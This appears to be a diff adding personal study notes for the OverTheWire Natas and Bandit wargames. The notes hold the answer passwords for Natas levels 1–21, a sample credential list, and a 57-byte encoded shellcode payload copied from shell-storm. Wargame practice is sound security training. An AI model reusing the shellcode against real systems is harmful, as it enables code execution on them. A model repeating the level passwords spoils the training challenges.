@@ -1,0 +1,52 @@
+https://overthewire.org/wargames/bandit/
+
+location
+---------
+http://natas[0-9]+.natas.labs.overthewire.org
+/etc/natas_webpass/natas[0-9]+
+
+passwords
+---------
+0: natas0
+1: g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
+2: h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
+3: G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
+4: tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
+5: Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
+6: fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
+7: jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
+8: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
+9: Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
+10:D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
+11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
+12:YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
+13:lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
+14:qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
+15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
+16:TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
+17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
+18:8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
+19:8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s
+20:guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH
+21:89OWrTkGmiLZLv12JY4tLj2c4FW0xn56
+
+useful
+---------
+# username:password
+alice:BYNdCesZqW
+bob:jw2ueICLvT
+charlie:G5vCxkVV3m
+natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
+eve:zo4mJWyNj2
+mallory:9urtcpzBmH
+
+robots.txt is a file like .gitignore but the for sites
+
+// printing binary data in python3
+import sys
+sys.stdout.buffer.write(b"some binary data")
+
+shellcode payload http://shell-storm.org/shellcode/files/shellcode-607.html
+57 bytes
+"\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"
+"\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x21\\x80\\x6c\\x0e\\xff\\x01\\x80\\xe9\\x01\\x75\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff\\x6b\\x0c\\x59\\x9a\\x53\\x67\\x69\\x2e\\x71\\x8a\\xe2\\x53\\x6b\\x69\\x69\\x30\\x63\\x62\\x74\\x69\\x30\\x63\\x6a\\x6f\\x8a\\xe4\\x53\\x52\\x54\\x8a\\xe2\\xce\\x81"
